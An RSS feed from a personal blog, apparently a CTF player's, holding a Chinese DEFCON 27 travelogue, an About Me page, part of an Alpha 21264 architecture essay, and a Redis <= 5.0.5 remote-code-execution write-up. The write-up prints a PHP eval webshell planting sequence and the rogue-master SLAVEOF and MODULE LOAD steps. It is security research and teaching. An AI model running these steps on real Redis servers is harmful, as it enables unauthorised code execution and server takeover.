<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>n0b0dy&#39;s site on n0b0dy&#39;s site</title>
    <link>https://n0b0dycn.me/</link>
    <description>Recent content in n0b0dy&#39;s site on n0b0dy&#39;s site</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 10 Aug 2019 11:34:22 +0800</lastBuildDate>
    <atom:link href="/" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Defcon 27游记</title>
      <link>https://n0b0dycn.me/2019/08/defcon27/</link>
      <pubDate>Sat, 10 Aug 2019 11:34:22 +0800</pubDate>
      
      <guid>https://n0b0dycn.me/2019/08/defcon27/</guid>
      <description>

&lt;p&gt;飞机上无事，记录一下第一次打defcon的参赛经历以及在华盛顿D.C.的游记。&lt;/p&gt;

&lt;h2 id=&#34;签证&#34;&gt;签证&lt;/h2&gt;

&lt;p&gt;在6.9的0ctf获得冠军以后，我就开始准备签证。经过了一番纠结和调研以后，决定在6月24号和国佬一起去沈阳的使馆签证。我在23号的晚上抵达沈阳，吃了个烤串以后就回到酒店休息了。我订的酒店离使馆步行只有不到十分钟的旅程，很大程度上节省了跑来跑去的时间。24号面签，在签证官要了我导师的简历以后果断被check，而国佬则顺利拿到了十年签。&lt;/p&gt;

&lt;p&gt;由于这次面签比去年早，所以我最开始觉得还是比较稳的。但是直到8月签证还没有issue，就感觉又要凉凉。最后8月2号签证issue，8月6号在中信自取到护照。由于队友们6号凌晨就走了，所以在6号当天买了7号的飞机，和TD的大佬们搭伙飞往Las Vegas。&lt;/p&gt;

&lt;h2 id=&#34;defcon&#34;&gt;DEFCON&lt;/h2&gt;

&lt;h3 id=&#34;8月7日&#34;&gt;8月7日&lt;/h3&gt;

&lt;p&gt;中午11点左右抵达Las Vegas，住在Planet Hollywood酒店。从机场打车大概十几刀就可以到，路程大概十几分钟。到酒店后直接把行李扔前台然后去和队友们到唐人街吃麻辣烫。丁佬的同学的男票开车贼猛，特别害怕.jpg。麻辣烫特别辣，如果有同学去吃除非四川重庆硬汉否则千万不要点特辣的。&lt;/p&gt;

&lt;p&gt;下午在房间休息了一下之后晚上去参加了百度的晚宴，于是第一次走进了大名鼎鼎的巴黎酒店。虽然后几天看惯了这些酒店以后感觉见怪不怪，但是第一次看赌场酒店的装潢还是很开眼的。晚宴是西餐，队友们都觉得贼难吃但是我觉得还不错。回到房间以后就直接洗洗睡了。&lt;/p&gt;

&lt;h3 id=&#34;8月8日&#34;&gt;8月8日&lt;/h3&gt;

&lt;p&gt;由于本身比赛也是昏天暗地的打，于是就没有特地倒时差。所以defcon期间我基本上都是凌晨3点左右就醒了。早上起来和atum，夜影，Neo，pupi1es吃了个自助早饭。这顿早饭是我在美国吃到的最丰盛的一顿早饭，也让队友对我的食量有了一个明确的认知。吃完饭回房间准备defcon主办方说明需要准备的环境。中午在Caesars Palace吃自助，麦香的老板请客。实际上自助还是不错的，但是由于早饭吃的太多所以其实这顿并没有吃很多。晚上由于时差直接睡过晚饭，晚上9点多起床继续装环境，12点睡3点醒。&lt;/p&gt;

&lt;h3 id=&#34;8月9日&#34;&gt;8月9日&lt;/h3&gt;

&lt;p&gt;DEFCON第一天。6点起床和Harold一起吃了麦当劳的早饭，吃完以后帮Oroggs带了一份回房间。9点到比赛现场10点开始比赛。在分工里我被分配到了代码组，但实际上我在比赛中的主要任务就是写写bot，遇到和web沾边儿的题帮忙提供一点思路，以及后勤。第一天twitter的bot上线以后以及本来想写一个统计分数的bot，结果怎么算都和主办方给出的分数不一样，遂放弃，后知主办方的计分似乎出了点儿bug。&lt;/p&gt;

&lt;p&gt;第一天开场放了两道题目，分别为telooogram与ropship。前者是一个ios的AWD，我们队成功拿下了一波分，但是似乎由于非预期解过多被早早下线。ropship是一个KoH的题目，通过rop操作小船互相打子弹。由于我队任务分配原因，这道题到最后也没有实现最基本的功能，即让小船动起来，导致一直没有得分。此题在当天比赛结束前被关闭。&lt;/p&gt;

&lt;p&gt;下午另一个AWD题目aoool上线。这道题是一个手搓的类似nginx的反向代理服务器。这是一个c++的lexer，我们没有能够很完整地把这个题逆完，也没有成功猜出配置文件格式，导致我们压根没有把这个服务成功跑起来。期间发现了部分crash但是没有能够成功利用。在流量放出来以后我们写了脚本收了一波分。&lt;/p&gt;

&lt;p&gt;这天还有一个题是AI-HAN-SOLO。这个题和去年的那个深度学习的题有点类似。由于没做这道题所以并不是很了解具体情况，似乎最后也没太搞出来。&lt;/p&gt;

&lt;p&gt;晚上结束的时候剩了aoool和AI-HAN-SOLO，大家各自做题。晚饭是外卖的panda express。在三顿吃到一样的菜以后这辈子都不太想吃这个了QAQ。&lt;/p&gt;

&lt;h3 id=&#34;8月10日&#34;&gt;8月10日&lt;/h3&gt;

&lt;p&gt;照例3点多睡醒，早上在房间吃到了麦当劳的早饭，此处感谢蓝猫和pupi1es送温暖。9点左右到达赛场后放了xbox题目booom，然后我们就发现我们没得显示器。试了一下Neo的发展需要驱动用不了，于是我和麦香去附近的best buy直接买了一个。但是显示器买回来以后疑似xbox坏了，导致这道题又没怎么搞，十分蛋疼。最后发现xbox其实没坏，于是就觉得更蛋疼了。&lt;/p&gt;

&lt;p&gt;接着主办方放出了两个题，babi和mirror-universe。babi是一个rust搓的php，有反序列化的操作。似乎有double free漏洞但是没能利用成功。mirror-universe是一个lisp的题目，没看所以不太清楚什么情况，但是好像全场被PPP爆捶。&lt;/p&gt;

&lt;p&gt;之后又放了一个KoH题目bitflip-conjecture。这个题目目的是写shellcode输出一个字符串，在随机flip一个bit后代码仍然能够正常工作。晚上我们把这道题搞到了996分。&lt;/p&gt;

&lt;p&gt;午饭和晚饭吃的都是panda express。晚上临结束的时候放出了super smash ooos。&lt;/p&gt;

&lt;h3 id=&#34;8月11日&#34;&gt;8月11日&lt;/h3&gt;

&lt;p&gt;11号是比赛的最后一天。由于我们的房间11号中午11点就要退房，于是早上把行李搬到了套房。这天scoreboard和game status都不再更新。其实昨天写了一个统计每轮播报game status的bot，但是出了一个很傻逼的bug导致一直没有work，惨兮兮。10点左右放了一个web题，我们迅速把显而易见的洞补了，但是到最后也没成功写出exp。
在11点左右，TD将bitflip做到了1000分，十分牛逼。之后问Riatre得知他们是手搓到999以后用机器枚举出来的。&lt;/p&gt;

&lt;p&gt;下午2点比赛结束，大家在场地social一下喝一点酒，到4点多去楼下吃了个中餐。晚上参加到了Hyatt Place酒店后，我在房间睡了一觉。队友们有的去了PPP组织的party。9点多的时候被Oroggs叫醒，自己打车去长街溜达了一圈，看了看沿路的一些酒店，12点半回到酒店睡觉。&lt;/p&gt;

&lt;h3 id=&#34;8月12日&#34;&gt;8月12日&lt;/h3&gt;

&lt;p&gt;南奥特莱斯一日游，有钱人在蔻驰的购买力真的牛逼。晚上吃了帝王蟹腿和虾。送走了当天凌晨返回北京的队友之后自己打车入住了Bally&amp;rsquo;s酒店。11点入住完早上4点就撤，血亏。&lt;/p&gt;

&lt;h3 id=&#34;defcon总结&#34;&gt;DEFCON总结&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;一个web手在DEFCON中还是能够很好的生存的，因为其实就是没我们什么事。把后勤处理好到处帮忙就好了。&lt;/li&gt;
&lt;li&gt;本次比赛看上去还是存在部分沟通问题。在ropship这道题目中，由于沟通不到位，虽然攻击的策论貌似有人写了，但是由于基础代码没有写出来，所以也没什么鸟用。这件事情如果能进行有效的沟通，我们这个KoH没准可以得到一些分数。在以后的比赛中可以以此为鉴，合理优化题目分工。&lt;/li&gt;
&lt;li&gt;我们队在AWD比赛中的基础设施一向是匮乏的，比如没有成熟的auto exploit framwork，没有成熟的比赛情况统计系统，所有设施都可能需要到现场手搓。对于DEFCON这种对手成熟甚至有职业队的比赛，可能导致我们在比赛中浪费较多的时间在基础建设。祝愿明年打defcon的时候能够有一套自己的可用的基础设施。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;whongton-d-c&#34;&gt;Whongton D.C.&lt;/h2&gt;

&lt;h3 id=&#34;8月13日&#34;&gt;8月13日&lt;/h3&gt;

&lt;p&gt;13号凌晨4点从酒店出发，乘坐飞往DC的飞机。由于飞机上有小孩子和装小孩子的车难以安置，所以起飞延误了一些。中午到达杜勒斯机场，乘坐2点左右的机场巴士($7.5)顺利到达一雄住处。在经历了早起、飞机上没午饭、空调温度巨低后又见巨大上下坡一度心态崩掉@_@。&lt;/p&gt;

&lt;p&gt;在一雄家里喝了杯橙汁以后出发去乔治城先吃了个龙虾卷。吃完以后逛了乔治城和乔治城大学。乔治城里面都是一幢一幢的房子，街区非常漂亮，有些神似天津五大道，但是比五大道还要美。这里的变成了我心中最想住的地方。乔治城大学则是一个环境极好的大学，听一雄说里面贵胄子弟很多。学校里面的教学楼有种几百年前建筑的风格，让我实名嫌弃北大。&lt;/p&gt;

&lt;p&gt;逛完以后二人来到河边长椅上瘫着，目力可及处能看到宽宽的河，大片的绿地，右手边的乔治城以及远方正在堵车的大桥。休息了一会儿后我们去了一家中餐厅吃火锅。据一雄说这家火锅店的中餐外卖养活了他一年。总体来说肉很瓷实，吃的很痛快。这顿饭开始，我逐渐开始接受美国的冰水（在此之前我都是接酒店的自来水喝）。由于这天的下午没有睡觉，导致晚上回去的时候又累又困，竟然像当年春晖一样举着直播直接睡着了。之后被一雄唤醒，关了视频睡下了。&lt;/p&gt;

&lt;h3 id=&#34;8月14日&#34;&gt;8月14日&lt;/h3&gt;

&lt;p&gt;春晖和VV早上4点多抵达DC，check out以后去补觉了。我和一雄大概8点多起床，此时我的生物钟被彻底调整到纽约时区。10点左右，四人在白宫附近汇合。我们一起走了纪念碑，林肯纪念堂和Jefferson纪念堂。当天上午的阳光很厉害，中午大家都有些筋疲力竭。游览完以后，我们打车到了一雄提前订好的西餐厅。前菜是贝壳和柠檬鸡翅。光是前菜的量就已经很大了。主菜三个男生点了牛排，VV点了沙拉。牛排是5分熟的，非常好吃。配菜我点了西瓜和玉米。西瓜上面加了薄荷，很爽口。玉米我以为是玉米粒，但上上来以后发现是一整根玉米，最后硬着头皮吃完了，很甜但是也很撑233。&lt;/p&gt;

&lt;p&gt;下午我们先被司机带到了美术馆A，但一雄发现这不是他之前去的那个美术馆B。于是在A里面转了半个多小时以后就出来然后走到了美术馆B。美术馆B有四层，每层都是长方形的环廊平分为四个风格不同的展区。期中芭比娃娃的画展，人体行为艺术和最上层的两个玻璃橱窗给我留下了较为深刻的印象。美术馆中间是个封闭式的天井，有好多巨大的空调吹着，呆在里面十分舒适。我们在里面喝了一杯饮料，感受了一下资本主义的奢靡。&lt;/p&gt;

&lt;p&gt;在两个美术馆里，每一个展厅都有沙发或者长凳供参观者休息或者坐下来慢慢观赏，此处艾特国博等一票博物馆出来挨打。&lt;/p&gt;

&lt;p&gt;晚上我们步行到附近的一家日料。在众人惊诧的目光中我第一次吃到了章鱼小丸子和鳗鱼饭。此时我已经完全接受冰水这种设定，不知道能不能在回国以后保持一波。吃完饭以后我们各回各家，我和一雄在房间里看快乐源泉张大仙。洗漱睡觉不表。&lt;/p&gt;

&lt;h3 id=&#34;8月15日&#34;&gt;8月15日&lt;/h3&gt;

&lt;p&gt;早上起床，快10点的时候和春晖VV在某河的某码头汇合。我们先去吃了一个brunch。我点的是希腊风格的toast，吃过以后表示味道可以接受。吃完以后我带着我没喝完的奶昔上了皮划艇划船。春晖一个人划得比我和一雄两个人都快让我们感觉非常神奇。依稀记得上次划船应该还是小时候和父母在北海公园划，如今在异国划船，也算是重拾童趣。这天是阴天，没有很大的太阳，划船刚刚好。&lt;/p&gt;

&lt;p&gt;由于春晖VV订了下午2点的bus去纽约，我们中午在旁边的Shake Shack吃了一顿。春晖VV吃了汉堡，我和一雄各点了一杯奶昔。奶昔巨天，第一口喝得超爽，但喝到一半以后就有点受罪了。&lt;/p&gt;

&lt;p&gt;吃完饭后我们在旁边路上打车散伙。我们的uber司机纷纷走错路上错高速。其中我和一雄连续碰到了三次走错路然后取消的司机才顺利上车。打到的车的司机是一个埃及人，会用中文说“你好”和“谢谢”。我和一雄打车到家附近吃了越南粉，比较便宜但是也很好吃。&lt;/p&gt;

&lt;p&gt;吃完饭以后回到一雄的公寓休息一会儿就收拾东西回Las Vegas了。由于雷雨天气，飞机延误两个小时。晚上10点左右到了McCarran机场，我上次来的时候行李在T1，于是就轻车熟路地走到了T1，然后发现并没有我的航班的belt。在四处询问以后发现我的行李带在T3，于是赶紧搭摆渡车冲回T3。&lt;/p&gt;

&lt;p&gt;打车到Luxor金字塔酒店，司机蜜汁开到了后门，然后在酒店里转了半天才找到前台。check in以后发现自己的房间在一层，虽然说是金字塔房间但是毛线都看不到ヽ(#`Д´)ﾉ。洗漱睡觉不表。&lt;/p&gt;

&lt;h3 id=&#34;8月16日&#34;&gt;8月16日&lt;/h3&gt;

&lt;p&gt;早上7点不到自然醒后就不太能睡着了，于是玩手机到8点从酒店出发，check out然后去机场。走的时候忘记拍照了很可惜。早饭在机场吃了汉堡王，喝了一大杯咖啡以后还嫖了杯芬达带走。到登基口以后发现自己来的太早，只能坐着玩手机。到西雅图以后不用重新托运，于是去春晖推荐的巧克力店买了一些巧克力，然后继续在登机口玩手机。下午4:43飞机起飞，飞往北京，于北京时间17号下午8点落地。结束充实的10天。&lt;/p&gt;

&lt;h2 id=&#34;其它&#34;&gt;其它&lt;/h2&gt;

&lt;h3 id=&#34;时差&#34;&gt;时差&lt;/h3&gt;

&lt;p&gt;DEFCON比赛期间的七荤八素没什么时间概念，到了华盛顿以后才调整好时间。个人感觉到美的第一天可以什么时候想睡就什么时候睡，第二天撑着到正常睡觉的时间再睡就可以调整好时差了。从美国调到北京时间的操作还有待研究。&lt;/p&gt;

&lt;h3 id=&#34;开销&#34;&gt;开销&lt;/h3&gt;

&lt;p&gt;在美国主要的开销是打车。我在美国一共花了300刀左右的现金，其中有80刀的酒店度假费，五十刀左右的小费。而来来回回打车的钱大概花了有110刀。似乎如果用uber的话会便宜一些，但是我没有信用卡且uber不支持paypal的银联信用卡付款，导致花了很多的钱。回国以后我会立即办一张信用卡以备不时之需。&lt;/p&gt;

&lt;h3 id=&#34;机场&#34;&gt;机场&lt;/h3&gt;

&lt;p&gt;回想一下去机场的经历：
1. 北京机场转西雅图到Vegas，早上去的太早了导致很无聊。西雅图过海关重新托运行李转机流程很快。所以转机的行李重新托运完全不必慌张。
2. Vegas飞华盛顿D.C.，由于是6点的飞机，我早上4点到机场，check in和安检的工作人员都特别少，导致值机过程挺长的，基本上没有太多富裕时间。
3. 华盛顿D.C.飞Vegas，巴士迟到了几分钟但是无伤大雅，时间基本正好，安安稳稳上飞机
4. Vegas转西雅图飞北京，去的太早了。虽然我是国际航班，但第一段在美国境内，所以时间不紧。加上9点左右到机场，安检全开，吞吐量很大。晚一个小时出发也完全赶趟。西雅图转机行李直挂，所以转机也不着急。&lt;/p&gt;

&lt;p&gt;以上行程供大家参考，合理安排时间保证睡眠。&lt;/p&gt;

&lt;h3 id=&#34;酒店&#34;&gt;酒店&lt;/h3&gt;

&lt;p&gt;Vegas长街上的酒店都很有特色。但是要注意在飞猪上的价钱可能不是最终的价钱，很多酒店会有resort fee，如果你像麦香老板一样有钻石会员的话就可以省掉resort fee。如果你要住很多天的话可以搞一个钻石会员，不仅省钱而且在很多地方都不用排队。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Redis &lt;= 5.0.5 RCE</title>
      <link>https://n0b0dycn.me/2019/07/redis-rce/</link>
      <pubDate>Sun, 07 Jul 2019 10:08:33 +0800</pubDate>
      
      <guid>https://n0b0dycn.me/2019/07/redis-rce/</guid>
      <description>

&lt;h1 id=&#34;redis-5-0-5-rce&#34;&gt;Redis &amp;lt;= 5.0.5 RCE&lt;/h1&gt;

&lt;p&gt;本文介绍由LCBC战队队员Pavel Toporkov在zeronights 2018上介绍的redis 4.x RCE攻击。会议slide链接：&lt;a href=&#34;https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;攻击场景：
* 能够访问远程redis的端口（直接访问或者SSRF）
* 对redis服务器可以访问到的另一台服务器有控制权&lt;/p&gt;

&lt;p&gt;本文的exp开源在github上：&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/n0b0dyCN/redis-rogue-server&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/n0b0dyCN/redis-rogue-server&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;欢迎大家来star~&lt;/p&gt;

&lt;h2 id=&#34;背景知识&#34;&gt;背景知识&lt;/h2&gt;

&lt;h3 id=&#34;redis协议&#34;&gt;redis协议&lt;/h3&gt;

&lt;p&gt;redis支持两种传输协议，一种是明文传输，其命令如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;SET keyname value\n
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;另一种是经过编码的传输协议：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;*3\r\n$3\r\nSET\r\n$7\r\nkeyname\r\n$5\r\nval
ue\r\n
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;将其格式化大概长这个样子：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;*&amp;lt;number of arguments&amp;gt; CR LF
$&amp;lt;number of bytes of argument 1&amp;gt; CR LF
&amp;lt;argument data&amp;gt; CR LF
...
$&amp;lt;number of bytes of argument N&amp;gt; CR LF
&amp;lt;argument data&amp;gt; CR LF
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;笔者主要使用第二种协议实现exp。&lt;/p&gt;

&lt;h3 id=&#34;config-set&#34;&gt;CONFIG SET&lt;/h3&gt;

&lt;p&gt;CONFIG SET命令用于对redis进行配置。常用如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;CONFIG SET dir /VAR/WWW/HTML
CONFIG SET dbfilename sh.php
SET PAYLOAD &#39;&amp;lt;?php eval($_GET[0]);?&amp;gt;&#39;
BGSAVE
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是之前redis常用的getshell套路。但是由于权限问题，并不是总能成功写入文件。&lt;/p&gt;

&lt;h3 id=&#34;slaveof&#34;&gt;SLAVEOF&lt;/h3&gt;

&lt;p&gt;SLAVEOF命令为redis设置主服务器。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;127.0.0.1:6379&amp;gt; SLAVEOF 127.0.0.1 7000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;该命令将端口为6379的服务器的主服务器设置为端口为7000的服务器。端口为6379的服务器将开始同步端口为7000服务器的数据来保证数据的一致性。同时服务器可以随时取消主从状态：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;127.0.0.1:6379&amp;gt; SLAVEOF NO ONE
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;SLAVE和MASTER之间的握手机制如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/redis-4.x-rce/sync-protocol.png&#34; alt=&#34;SYNC protocol&#34; /&gt;&lt;/p&gt;

&lt;p&gt;握手后SLAVE将向MASTER发送PSYNC请求同步，一般有三种状态：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;FULLRESYNC：表示需要全量复制&lt;/li&gt;
&lt;li&gt;CONTINUE：表示可以进行增量同步&lt;/li&gt;
&lt;li&gt;ERR：表示主服务器还不支持PSYNC&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;module-load&#34;&gt;MODULE LOAD&lt;/h3&gt;

&lt;p&gt;MODULE LOAD命令为redis加载外部的模块，该模块可以自定义。模块编写方法可以参考官方示例：&lt;a href=&#34;https://github.com/RedisLabs/RedisModulesSDK&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/RedisLabs/RedisModulesSDK&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;该命令使用方式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;MODULE LOAD /path/to/exp.so
MODULE UNLOAD exp
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;攻击流程&#34;&gt;攻击流程&lt;/h2&gt;

&lt;h3 id=&#34;rogue-server&#34;&gt;Rogue Server&lt;/h3&gt;

&lt;p&gt;我们需要建一个服务器来在同步过程中向redis server发送我们的module。服务器要响应redis的请求：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;[&amp;gt;] PING - test if a connection is still alive
[&amp;lt;] +PONG
[&amp;gt;] REPLCONF - exchange replication information between master and slave
[&amp;lt;] +OK
[&amp;gt;] PSYNC/SYNC - synchronize slave state with the master
[&amp;lt;] +FULLRESYNC
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;步骤&#34;&gt;步骤&lt;/h3&gt;

&lt;h4 id=&#34;将redis设置为我们的slave&#34;&gt;将redis设置为我们的slave&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;SLAVEOF server port
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;设置redis的数据库文件&#34;&gt;设置redis的数据库文件&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;CONFIG SET dbfilename exp.so
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;从rogue-server接收module&#34;&gt;从rogue server接收module&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;+FULLRESYNC &amp;lt;Z*40&amp;gt; 1\r\n$&amp;lt;len&amp;gt;\r\n&amp;lt;payload&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;加载模块&#34;&gt;加载模块&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;MODULE LOAD ./exp.so
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;攻击效果&#34;&gt;攻击效果&lt;/h3&gt;

&lt;p&gt;设置主服务器与数据库文件：
&lt;img src=&#34;https://n0b0dycn.me/images/posts/redis-4.x-rce/step1.png&#34; alt=&#34;step 1&#34; /&gt;&lt;/p&gt;

&lt;p&gt;向redis server发送payload：
&lt;img src=&#34;https://n0b0dycn.me/images/posts/redis-4.x-rce/step2.png&#34; alt=&#34;step 2&#34; /&gt;&lt;/p&gt;

&lt;p&gt;加载模块：
&lt;img src=&#34;https://n0b0dycn.me/images/posts/redis-4.x-rce/step3.png&#34; alt=&#34;step 3&#34; /&gt;&lt;/p&gt;

&lt;p&gt;最终可以实现命令执行：
&lt;img src=&#34;https://n0b0dycn.me/images/posts/redis-4.x-rce/step4.png&#34; alt=&#34;step 4&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>About Me</title>
      <link>https://n0b0dycn.me/about/</link>
      <pubDate>Sat, 01 Jun 2019 16:35:31 +0800</pubDate>
      
      <guid>https://n0b0dycn.me/about/</guid>
      <description>

&lt;h1 id=&#34;me&#34;&gt;Me&lt;/h1&gt;

&lt;p&gt;Tianyi Li&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.icst.pku.edu.cn/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Institute of Computer Science and Technology&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.pku.edu.cn/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Peking University&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;ctf&#34;&gt;CTF&lt;/h2&gt;

&lt;p&gt;Team：&lt;a href=&#34;http://r3ka.eu/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Eur3kA&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://r3kapig.com/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;r3kapig&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ID: n0b0dy&lt;/p&gt;

&lt;h2 id=&#34;education&#34;&gt;Education&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;2018 - present&lt;/strong&gt;, Peking University (PKU)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Institute of Computer Science &amp;amp; Technology (ICST).&lt;/li&gt;
&lt;li&gt;Master of Science in Computer Application Technology&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;2014 - 2018&lt;/strong&gt;, Peking University (PKU)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The School of Electronics Engineering and Computer Science (EECS).&lt;/li&gt;
&lt;li&gt;Bachelor of Science in Computer Science and Technology&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;projects&#34;&gt;Projects&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/mesalock-linux/gbdt-rs&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;&lt;strong&gt;gbdt-rs&lt;/strong&gt;&lt;/a&gt;: a fast and secure GBDT library, supporting TEEs such as Intel SGX and ARM TrustZone&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/n0b0dyCN/redis-rogue-server&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;&lt;strong&gt;Redis Rogue Server&lt;/strong&gt;&lt;/a&gt;: Redis &amp;lt;= 5.0.5 RCE exploit&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;publications&#34;&gt;Publications&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Tianyi Li&lt;/strong&gt;, Tongxin Li, Yu Ding, Yulong Zhang, Tao Wei, Xinhui Han Poster: gbdt-rs: Fast and Trustworthy Gradient Boosting Decision Tree, Security &amp;amp; Privacy IEEE, 2019&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Guancheng Li, Yongheng Chen, &lt;strong&gt;Tianyi Li&lt;/strong&gt;, Tongxin Li, Xinfeng Wu, Chao Zhang, Xinhui Han POSTER: PT-DBG: Automatically anti-debugging bypassing based on Intel Processor Trace，Security &amp;amp; Privacy IEEE, 2018&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;contact-me&#34;&gt;Contact Me&lt;/h2&gt;

&lt;p&gt;Github: &lt;a href=&#34;https://github.com/n0b0dyCN&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/n0b0dyCN&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Email: n0b0dypku AT gmail.com&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Alpha 21264</title>
      <link>https://n0b0dycn.me/2019/04/alpha-21264/</link>
      <pubDate>Thu, 11 Apr 2019 17:04:22 +0800</pubDate>
      
      <guid>https://n0b0dycn.me/2019/04/alpha-21264/</guid>
      <description>

&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;

&lt;p&gt;本文为北京大学研究生课程高等计算机体系结构（18-19学年第2学期）的作业。任务是对Alpha Microprocessor的设计进行综述。笔者才疏学浅，不到之处望读者斧正。&lt;/p&gt;

&lt;h2 id=&#34;总览&#34;&gt;总览&lt;/h2&gt;

&lt;p&gt;Alpha 21264处理器每个周期可以取四条指令，同时其在内部支持乱序执行。在这种情况下，指令可以被并行执行，并且可以在其最早的能执行的时刻被执行。同时，此处理器支持推测执行，很大程度上加速了处理器的执行速度。Alpha 21264处理器复杂的转移预测机制支持了推测执行。在这些设计的支持下，该处理器的速度比前代Alpha 21164快50%到200%。&lt;/p&gt;

&lt;p&gt;在存储系统方面，Alpha 21264提供了片上与片下的缓存系统，降低了访问存储的平均延迟。同时，21264也增加了对内存的并行访问，提高了数据带宽。在Stream benchmark中，Alpha 21264能够获得1.3GBytes/sec的访存速度。&lt;/p&gt;

&lt;p&gt;Alpha 21264的主频在500至600MHz之间，由15M个2.2V，0.35mm晶体管组成。芯片面积为$3.1cm^2$，有587个管脚。芯片平面图如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/die-photo.png&#34; alt=&#34;die photo&#34; /&gt;&lt;/p&gt;

&lt;p&gt;芯片的结构抽象图如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/ins-pipeline.png&#34; alt=&#34;Instruction Pipeline&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;指令流-instruction-pipeline-fetch&#34;&gt;指令流 (Instruction Pipeline &amp;ndash; Fetch)&lt;/h2&gt;

&lt;p&gt;Alpha 21264处理器每个周期会向乱序执行部件传递四条指令。处理器会根据转移预测指令来进行指令的预取。由于转移预测的准确率极高，所以流水线在绝大部分时候都能被正确的指令所填充。&lt;/p&gt;

&lt;p&gt;Alpha 21264通过两个结构支持取指的高效：路组预测(line and way prediction)和转移预测(branch prediction)。&lt;/p&gt;

&lt;h3 id=&#34;line-and-way-prediction&#34;&gt;Line and way prediction&lt;/h3&gt;

